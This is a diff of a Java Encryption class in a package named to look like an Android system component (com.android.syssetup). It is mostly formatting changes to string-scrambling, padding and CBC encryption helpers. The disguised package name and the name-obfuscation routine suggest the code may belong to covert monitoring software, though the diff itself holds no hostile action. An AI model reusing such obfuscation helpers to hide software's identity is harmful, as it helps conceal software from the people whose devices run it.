@@ -19,14 +19,19 @@ import com.android.syssetup.util.Check;
  */
 public class Encryption {
 
-	/** The Constant TAG. */
+	/**
+	 * The Constant TAG.
+	 */
 	private static final String TAG = "Encryption"; //$NON-NLS-1$
+	/**
+	 * The crypto.
+	 */
+	Crypto crypto;
 
 	/**
 	 * Instantiates a new encryption.
-	 * 
-	 * @param key
-	 *            the key
+	 *
+	 * @param key the key
 	 */
 	public Encryption(final byte[] key) {
 		makeKey(key);
@@ -42,11 +47,9 @@ public class Encryption {
 	/**
 	 * Descrambla una stringa, torna il puntatore al nome descramblato. La
 	 * stringa ritornata va liberata dal chiamante con una free()!!!!
-	 * 
-	 * @param Name
-	 *            the name
-	 * @param seed
-	 *            the seed
+	 *
+	 * @param Name the name
+	 * @param seed the seed
 	 * @return the string
 	 */
 	public static String decryptName(final String Name, final int seed) {
@@ -56,11 +59,9 @@ public class Encryption {
 	/**
 	 * Scrambla una stringa, torna il puntatore al nome scramblato. La stringa
 	 * ritornata va liberata dal chiamante con una free()!!!!
-	 * 
-	 * @param Name
-	 *            the name
-	 * @param seed
-	 *            the seed
+	 *
+	 * @param Name the name
+	 * @param seed the seed
 	 * @return the string
 	 */
 	public static String encryptName(final String Name, final int seed) {
@@ -69,38 +70,14 @@ public class Encryption {
 	}
 
 	/**
-	 * Gets the next multiple.
-	 * 
-	 * @param len
-	 *            the len
-	 * @return the next multiple
-	 */
-	public int getNextMultiple(final int len) {
-		if (Cfg.DEBUG) {
-			Check.requires(len >= 0, "len < 0"); //$NON-NLS-1$
-		}
-		final int newlen = len + (len % 16 == 0 ? 0 : 16 - len % 16);
-		if (Cfg.DEBUG) {
-			Check.ensures(newlen >= len, "newlen < len"); //$NON-NLS-1$
-		}
-		if (Cfg.DEBUG) {
-			Check.ensures(newlen % 16 == 0, "Wrong newlen"); //$NON-NLS-1$
-		}
-		return newlen;
-	}
-
-	/**
 	 * Questa funzione scrambla/descrambla una stringa e ritorna il puntatore
 	 * alla nuova stringa. Il primo parametro e' la stringa da de/scramblare, il
 	 * secondo UN byte di seed, il terzo se settato a TRUE scrambla, se settato
 	 * a FALSE descrambla.
-	 * 
-	 * @param name
-	 *            the name
-	 * @param seed
-	 *            the seed
-	 * @param enc
-	 *            the enc
+	 *
+	 * @param name the name
+	 * @param seed the seed
+	 * @param enc  the enc
 	 * @return the string
 	 */
 	private static String scramble(final String name, int seed, final boolean enc) {
@@ -108,10 +85,10 @@ public class Encryption {
 		final int len = name.length();
 		int i, j;
 
-		final char[] alphabet = { '_', 'B', 'q', 'w', 'H', 'a', 'F', '8', 'T', 'k', 'K', 'D', 'M', 'f', 'O', 'z', 'Q',
+		final char[] alphabet = {'_', 'B', 'q', 'w', 'H', 'a', 'F', '8', 'T', 'k', 'K', 'D', 'M', 'f', 'O', 'z', 'Q',
 				'A', 'S', 'x', '4', 'V', 'u', 'X', 'd', 'Z', 'i', 'b', 'U', 'I', 'e', 'y', 'l', 'J', 'W', 'h', 'j',
 				'0', 'm', '5', 'o', '2', 'E', 'r', 'L', 't', '6', 'v', 'G', 'R', 'N', '9', 's', 'Y', '1', 'n', '3',
-				'P', 'p', 'c', '7', 'g', '-', 'C' };
+				'P', 'p', 'c', '7', 'g', '-', 'C'};
 
 		final int alphabetLen = alphabet.length;
 
@@ -146,14 +123,30 @@ public class Encryption {
 		return new String(retString);
 	}
 
-	/** The crypto. */
-	Crypto crypto;
+	/**
+	 * Gets the next multiple.
+	 *
+	 * @param len the len
+	 * @return the next multiple
+	 */
+	public int getNextMultiple(final int len) {
+		if (Cfg.DEBUG) {
+			Check.requires(len >= 0, "len < 0"); //$NON-NLS-1$
+		}
+		final int newlen = len + (len % 16 == 0 ? 0 : 16 - len % 16);
+		if (Cfg.DEBUG) {
+			Check.ensures(newlen >= len, "newlen < len"); //$NON-NLS-1$
+		}
+		if (Cfg.DEBUG) {
+			Check.ensures(newlen % 16 == 0, "Wrong newlen"); //$NON-NLS-1$
+		}
+		return newlen;
+	}
 
 	/**
 	 * Make key.
-	 * 
-	 * @param key
-	 *            the key
+	 *
+	 * @param key the key
 	 */
 	public void makeKey(final byte[] key) {
 		try {
@@ -171,12 +164,10 @@ public class Encryption {
 
 	/**
 	 * Decrypt data.
-	 * 
-	 * @param cyphered
-	 *            the cyphered
+	 *
+	 * @param cyphered the cyphered
 	 * @return the byte[]
-	 * @throws CryptoException
-	 *             the crypto exception
+	 * @throws CryptoException the crypto exception
 	 */
 	public byte[] decryptData(final byte[] cyphered) throws CryptoException {
 		return decryptData(cyphered, cyphered.length, 0);
@@ -184,14 +175,11 @@ public class Encryption {
 
 	/**
 	 * Decrypt data.
-	 * 
-	 * @param cyphered
-	 *            the cyphered
-	 * @param offset
-	 *            the offset
+	 *
+	 * @param cyphered the cyphered
+	 * @param offset   the offset
 	 * @return the byte[]
-	 * @throws CryptoException
-	 *             the crypto exception
+	 * @throws CryptoException the crypto exception
 	 */
 	public byte[] decryptData(final byte[] cyphered, final int offset) throws CryptoException {
 		return decryptData(cyphered, cyphered.length - offset, offset);
@@ -199,16 +187,12 @@ public class Encryption {
 
 	/**
 	 * Decrypt data, CBC mode.
-	 * 
-	 * @param cyphered
-	 *            the cyphered
-	 * @param plainlen
-	 *            the plainlen
-	 * @param offset
-	 *            the offset
+	 *
+	 * @param cyphered the cyphered
+	 * @param plainlen the plainlen
+	 * @param offset   the offset
 	 * @return the byte[]
-	 * @throws CryptoException
-	 *             the crypto exception
+	 * @throws CryptoException the crypto exception
 	 */
 	public byte[] decryptData(final byte[] cyphered, final int plainlen, final int offset) throws CryptoException {
 		final int enclen = cyphered.length - offset;
@@ -218,12 +202,12 @@ public class Encryption {
 		if (Cfg.DEBUG) {
 			Check.requires(enclen >= plainlen, "Wrong plainlen"); //$NON-NLS-1$
 		}
-		
+
 		if (Cfg.DEBUG) {
 			Check.requires(crypto != null, "null encryption"); //$NON-NLS-1$
 		}
-		
-		byte[] plain=null;
+
+		byte[] plain = null;
 		try {
 			plain = crypto.decrypt(cyphered, plainlen, offset);
 		} catch (Exception e) {
@@ -231,16 +215,15 @@ public class Encryption {
 				Check.log(TAG + " (decryptData) Error: " + e);
 			}
 		}
-		
-		
+
+
 		return plain;
 	}
 
 	/**
 	 * Encrypt data.
-	 * 
-	 * @param plain
-	 *            the plain
+	 *
+	 * @param plain the plain
 	 * @return the byte[]
 	 */
 	public byte[] encryptData(final byte[] plain) {
@@ -249,17 +232,17 @@ public class Encryption {
 
 	/**
 	 * Encrypt data in CBC mode and HT padding.
-	 * 
-	 * @param plain
-	 *            the plain
-	 * @param offset
-	 *            the offset
-	 * @param len 
+	 *
+	 * @param plain  the plain
+	 * @param offset the offset
+	 * @param len
 	 * @return the byte[]
 	 */
 	public byte[] encryptData(final byte[] plain, final int offset, int len) {
 
-		if (Cfg.DEBUG) { Check.asserts(len > 0, " (encryptData) Assert failed, zero len"); }
+		if (Cfg.DEBUG) {
+			Check.asserts(len > 0, " (encryptData) Assert failed, zero len");
+		}
 
 		// TODO: optimize, non creare padplain, considerare caso particolare
 		// ultimo blocco
@@ -269,16 +252,18 @@ public class Encryption {
 		if (Cfg.DEBUG) {
 			Check.asserts(clen % 16 == 0, "Wrong padding"); //$NON-NLS-1$
 		}
-		byte[] crypted=null;
+		byte[] crypted = null;
 		try {
 			crypted = crypto.encrypt(padplain);
 		} catch (Exception e1) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (encryptData) Error: " + e1);
 			}
-		} 
+		}
 
-		if (Cfg.DEBUG) { Check.asserts(crypted!=null, " (encryptData) Assert failed, no crypted"); }
+		if (Cfg.DEBUG) {
+			Check.asserts(crypted != null, " (encryptData) Assert failed, no crypted");
+		}
 		return crypted;
 	}
 
@@ -289,14 +274,14 @@ public class Encryption {
 		if (Cfg.DEBUG) {
 			Check.asserts(clen % 16 == 0, "Wrong padding"); //$NON-NLS-1$
 		}
-		byte[] crypted=null;
+		byte[] crypted = null;
 		try {
 			crypted = crypto.encrypt(padplain, offset, lastBlock);
 		} catch (Exception e1) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (appendData) Error: " + e1);
 			}
-		} 
+		}
 
 		System.arraycopy(crypted, crypted.length - getBlockSize(), lastBlock, 0, getBlockSize());
 		return crypted;
@@ -304,13 +289,10 @@ public class Encryption {
 
 	/**
 	 * Old style Pad, PKCS5 is available in EncryptionPKCS5.
-	 * 
-	 * @param plain
-	 *            the plain
-	 * @param offset
-	 *            the offset
-	 * @param len
-	 *            the len
+	 *
+	 * @param plain  the plain
+	 * @param offset the offset
+	 * @param len    the len
 	 * @return the byte[]
 	 */
 	protected byte[] pad(final byte[] plain, final int offset, final int len) {
@@ -319,15 +301,11 @@ public class Encryption {
 
 	/**
 	 * Pad.
-	 * 
-	 * @param plain
-	 *            the plain
-	 * @param offset
-	 *            the offset
-	 * @param len
-	 *            the len
-	 * @param PKCS5
-	 *            the pKC s5
+	 *
+	 * @param plain  the plain
+	 * @param offset the offset
+	 * @param len    the len
+	 * @param PKCS5  the pKC s5
 	 * @return the byte[]
 	 */
 	protected byte[] pad(final byte[] plain, final int offset, final int len, final boolean PKCS5) {
@@ -349,11 +327,9 @@ public class Encryption {
 
 	/**
 	 * Xor.
-	 * 
-	 * @param pt
-	 *            the pt
-	 * @param iv
-	 *            the iv
+	 *
+	 * @param pt the pt
+	 * @param iv the iv
 	 */
 	void xor(final byte[] pt, final byte[] iv) {
 		if (Cfg.DEBUG) {
